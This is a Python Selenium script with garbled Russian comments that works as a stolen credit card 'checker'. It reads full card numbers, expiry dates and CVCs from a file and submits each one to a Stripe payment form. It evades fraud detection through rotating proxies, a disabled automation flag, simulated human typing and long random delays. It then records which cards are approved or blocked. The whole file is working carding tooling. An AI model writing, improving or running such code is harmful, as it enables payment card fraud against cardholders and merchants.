import os
import time
import random
import re
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager

# =================================================================
# –ö–û–ù–§–ò–ì–£–†–ê–¶–ò–Ø (–ó–ê–ü–û–õ–ù–ò–¢–ï –°–í–û–ò –î–ê–ù–ù–´–ï)
# =================================================================
STRIPE_PUBLIC_KEY = "–í–ê–® –ö–õ–Æ–ß"  # –ò–∑ Stripe Dashboard
CARDS_FILE = "cards.txt"                           # –§–∞–π–ª —Å –∫–∞—Ä—Ç–∞–º–∏
REPORT_FILE = "report.txt"                         # –§–∞–π–ª –æ—Ç—á–µ—Ç–∞
PROXY_LIST = [                                     # –†–µ–∑–µ—Ä–≤–Ω—ã–µ –ø—Ä–æ–∫—Å–∏
    "socks5://45.61.139.48:9999",
    "socks5://45.61.139.48:9999",
    "socks5://45.61.139.48:9999",
    "http://45.61.139.48:80",
    "http://45.61.139.48:80"
]

# =================================================================
# –û–°–ù–û–í–ù–û–ô –ö–õ–ê–°–° –ß–ï–ö–ï–†–ê
# =================================================================
class StripeCardChecker:
    def __init__(self):
        self.driver = None
        self.current_proxy = None
        self.init_driver()
        
    def init_driver(self):
        """–ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è Chrome –¥—Ä–∞–π–≤–µ—Ä–∞ —Å –ø—Ä–æ–∫—Å–∏"""
        chrome_options = Options()
        chrome_options.add_argument("--disable-blink-features=AutomationControlled")
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--disable-web-security")
        chrome_options.add_argument("--disable-gpu")
        chrome_options.add_argument("--disable-software-rasterizer")
        
        # –†–∞–Ω–¥–æ–º–Ω—ã–π –ø—Ä–æ–∫—Å–∏ –∏–∑ —Å–ø–∏—Å–∫–∞
        self.current_proxy = random.choice(PROXY_LIST)
        chrome_options.add_argument(f"--proxy-server={self.current_proxy}")
        
        # –î–ª—è –æ—Ç–ª–∞–¥–∫–∏ (—Ä–∞—Å–∫–æ–º–º–µ–Ω—Ç–∏—Ä—É–π—Ç–µ –¥–ª—è –≤–∏–¥–∏–º–æ–≥–æ —Ä–µ–∂–∏–º–∞)
        # chrome_options.add_argument("--headless=new")
        
        service = Service(ChromeDriverManager().install())
        self.driver = webdriver.Chrome(service=service, options=chrome_options)
        print(f"[DRIVER] Chrome initialized with proxy: {self.current_proxy}")

    def human_type(self, element, text):
        """–≠–º—É–ª—è—Ü–∏—è —á–µ–ª–æ–≤–µ—á–µ—Å–∫–æ–≥–æ –≤–≤–æ–¥–∞"""
        for char in text:
            element.send_keys(char)
            time.sleep(random.uniform(0.08, 0.15))

    def process_card(self, card_line):
        """–û–±—Ä–∞–±–æ—Ç–∫–∞ –æ–¥–Ω–æ–π –∫–∞—Ä—Ç—ã"""
        try:
            # –ü–∞—Ä—Å–∏–Ω–≥ –¥–∞–Ω–Ω—ã—Ö –∫–∞—Ä—Ç—ã
            parts = card_line.strip().split('|')
            if len(parts) < 4: 
                return f"‚ö†Ô∏è INVALID FORMAT: {card_line}"
                
            number, exp_month, exp_year, cvc = parts
            bin_code = number[:6]  # BIN –∫–æ–¥
            
            print(f"[PROCESSING] Card: {number[:6]}XXXXXX|{exp_month}|{exp_year}|XXX")
            
            # –û—Ç–∫—Ä—ã–≤–∞–µ–º —Ç–µ—Å—Ç–æ–≤—É—é —Å—Ç—Ä–∞–Ω–∏—Ü—É –æ–ø–ª–∞—Ç—ã
            self.driver.get("https://jsfiddle.net/artemvh/6L4p25xg/1/show")
            time.sleep(3)
            
            # –ü–µ—Ä–µ–∫–ª—é—á–∞–µ–º—Å—è –≤ iframe
            WebDriverWait(self.driver, 20).until(
                EC.frame_to_be_available_and_switch_to_it(
                    (By.CSS_SELECTOR, "iframe[name='result']")
                )
            )
            
            # –ü–µ—Ä–µ–∫–ª—é—á–∞–µ–º—Å—è –≤–æ –≤–Ω—É—Ç—Ä–µ–Ω–Ω–∏–π iframe Stripe
            WebDriverWait(self.driver, 20).until(
                EC.frame_to_be_available_and_switch_to_it(
                    (By.CSS_SELECTOR, "iframe[title='Secure card payment input frame']")
                )
            )
            
            # –ó–∞–ø–æ–ª–Ω—è–µ–º –¥–∞–Ω–Ω—ã–µ –∫–∞—Ä—Ç—ã
            number_field = WebDriverWait(self.driver, 15).until(
                EC.presence_of_element_located((By.NAME, "cardnumber"))
            )
            self.human_type(number_field, number)
            
            exp_field = self.driver.find_element(By.NAME, "exp-date")
            self.human_type(exp_field, f"{exp_month}{exp_year[2:]}")
            
            cvc_field = self.driver.find_element(By.NAME, "cvc")
            self.human_type(cvc_field, cvc)
            
            # –í–æ–∑–≤—Ä–∞—â–∞–µ–º—Å—è –≤ –æ—Å–Ω–æ–≤–Ω–æ–π –∫–æ–Ω—Ç–µ–∫—Å—Ç
            self.driver.switch_to.default_content()
            self.driver.switch_to.frame("result")  # –í–æ–∑–≤—Ä–∞—Ç –≤ —Ä–æ–¥–∏—Ç–µ–ª—å—Å–∫–∏–π —Ñ—Ä–µ–π–º
            
            # –ù–∞–∂–∏–º–∞–µ–º –∫–Ω–æ–ø–∫—É –æ–ø–ª–∞—Ç—ã
            pay_button = WebDriverWait(self.driver, 15).until(
                EC.element_to_be_clickable((By.CSS_SELECTOR, "button[type='submit']"))
            )
            pay_button.click()
            
            # –û–∂–∏–¥–∞–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç (—É–≤–µ–ª–∏—á–µ–Ω–æ –≤—Ä–µ–º—è –æ–∂–∏–¥–∞–Ω–∏—è)
            time.sleep(5)
            
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç
            try:
                # –£—Å–ø–µ—à–Ω–∞—è –æ–ø–ª–∞—Ç–∞
                success_element = WebDriverWait(self.driver, 10).until(
                    EC.visibility_of_element_located((By.XPATH, "//div[contains(text(), 'successful') or contains(text(), 'Success')]"))
                )
                return f"üá∫üá∏ {number}|{exp_month}|{exp_year}|{cvc} - ‚úÖ APPROVED (BIN: {bin_code})"
            except:
                try:
                    # –û—à–∏–±–∫–∞ –æ–ø–ª–∞—Ç—ã
                    error_element = WebDriverWait(self.driver, 10).until(
                        EC.visibility_of_element_located((By.CSS_SELECTOR, "[role='alert'], .error-message"))
                    )
                    error_text = error_element.text
                    status = self.classify_error(error_text)
                    return f"üá∫üá∏ {number}|{exp_month}|{exp_year}|{cvc} - {status} (BIN: {bin_code})"
                except:
                    return f"üá∫üá∏ {number}|{exp_month}|{exp_year}|{cvc} - ‚ö†Ô∏è UNKNOWN ERROR (BIN: {bin_code})"
                    
        except Exception as e:
            return f"üá∫üá∏ {number}|{exp_month}|{exp_year}|{cvc} - ‚ö†Ô∏è SYSTEM ERROR: {str(e)}"

    def classify_error(self, error_text):
        """–ö–ª–∞—Å—Å–∏—Ñ–∏–∫–∞—Ü–∏—è –æ—à–∏–±–æ–∫ Stripe"""
        error_text = error_text.lower()
        
        if "incorrect cvc" in error_text or "invalid cvc" in error_text:
            return "‚ùå BAD CVC"
        elif "expired" in error_text:
            return "‚ùå EXPIRED CARD"
        elif "insufficient funds" in error_text:
            return "‚ö†Ô∏è INSUFFICIENT FUNDS"
        elif "stolen" in error_text or "fraud" in error_text:
            return "‚ò¢Ô∏è FRAUD BLOCK"
        elif "do not honor" in error_text:
            return "‚ùå DO NOT HONOR"
        elif "invalid account" in error_text:
            return "‚ùå INVALID ACCOUNT"
        elif "card was declined" in error_text:
            return "‚ùå DECLINED"
        elif "processing error" in error_text:
            return "‚ò¢Ô∏è PROCESSING ERROR"
        elif "rate limit" in error_text:
            return "‚ò¢Ô∏è RATE LIMIT EXCEEDED"
        elif "cannot authorize" in error_text:
            return "‚ò¢Ô∏è CANNOT AUTHORIZE (POLICY)"
        else:
            return f"‚ùå {error_text[:50]}..."  # –û–±—Ä–µ–∑–∞–µ–º –¥–ª–∏–Ω–Ω—ã–µ —Å–æ–æ–±—â–µ–Ω–∏—è

    def run(self):
        """–û—Å–Ω–æ–≤–Ω–æ–π –º–µ—Ç–æ–¥ –∑–∞–ø—É—Å–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏"""
        # –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ñ–∞–π–ª–∞ —Å –∫–∞—Ä—Ç–∞–º–∏
        if not os.path.exists(CARDS_FILE):
            print(f"‚ùå ERROR: File {CARDS_FILE} not found!")
            return
        
        with open(CARDS_FILE, "r") as f:
            cards = [line.strip() for line in f.readlines() if line.strip()]
        
        if not cards:
            print("‚ùå ERROR: No cards found")
            return
        
        print(f"üöÄ Starting validation of {len(cards)} cards...")
        
        # –°–æ–∑–¥–∞–Ω–∏–µ –æ—Ç—á–µ—Ç–∞
        with open(REPORT_FILE, "w", encoding="utf-8") as report:
            for i, card in enumerate(cards):
                print(f"\n[{i+1}/{len(cards)}] Processing card...")
                
                # –ü–µ—Ä–µ–∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –¥—Ä–∞–π–≤–µ—Ä–∞ –∫–∞–∂–¥—ã–µ 5 –∫–∞—Ä—Ç
                if i > 0 and i % 5 == 0:
                    self.driver.quit()
                    self.init_driver()
                
                result = self.process_card(card)
                print(f"RESULT: {result}")
                report.write(result + "\n")
                report.flush()
                
                # –ü–∞—É–∑–∞ –º–µ–∂–¥—É –∫–∞—Ä—Ç–∞–º–∏ (2-4 –º–∏–Ω—É—Ç—ã)
                if i < len(cards) - 1:
                    delay = random.randint(120, 240)
                    mins, secs = divmod(delay, 60)
                    print(f"‚è≥ Waiting {mins} min {secs} sec...")
                    time.sleep(delay)
        
        print("\n‚úÖ Validation complete! Report saved to report.txt")
        self.driver.quit()

# =================================================================
# –ó–ê–ü–£–°–ö –ü–†–û–ì–†–ê–ú–ú–´
# =================================================================
if __name__ == "__main__":
    # –ü—Ä–æ–≤–µ—Ä–∫–∞ –æ–±—è–∑–∞—Ç–µ–ª—å–Ω—ã—Ö –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–≤
    if CARDS_FILE and os.path.exists(CARDS_FILE):
        checker = StripeCardChecker()
        checker.run()
    else:
        print(f"‚ùå ERROR: Cards file not found: {CARDS_FILE}")